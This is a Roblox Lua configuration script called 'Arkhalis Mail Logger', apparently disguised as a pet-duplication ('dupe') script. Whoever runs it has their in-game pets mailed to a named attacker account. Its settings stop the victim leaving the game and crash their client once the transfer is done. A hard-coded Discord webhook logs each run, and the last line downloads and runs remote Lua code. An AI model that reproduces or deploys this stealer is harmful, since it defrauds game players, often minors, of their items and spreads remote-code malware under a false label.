-[[ Arkhalis Mail Logger ]]--
 
--[[ Main Config ]]--
_G.Username = "unusunit2" --// Username To Send Pets To
_G.GiftMessage = "dupe load" --// Message For The Gift To Say
 
_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
_G.UnlockPets = true --// Unlocks Locked Pets
_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
_G.Crash = true  --// Crashes Them After Its Finished
 
--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1100496954305286144/yJNK6GE2hiduDTT9QFb0TUrjf2xzcdGXbguYW_UTzbR11iTll3ILLZJDJDMZCiDMILas" --// Discord Webhook For Executions
 
--[[ UI Config ]]--
_G.ScriptName = "dupe" --// Script Name On The UI
_G.Tip1 = "1" --// Gives You Tips On The UI
_G.Tip2 = "2" --// Gives You Tips On The UI
_G.Tip3 = "3" --// Gives You Tips On The UI
_G.Tip4 = "4" --// Gives You Tips On The UI
_G.Tip5 = "5" --// Gives You Tips On The UI
--[[ Script ]]--
 
loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
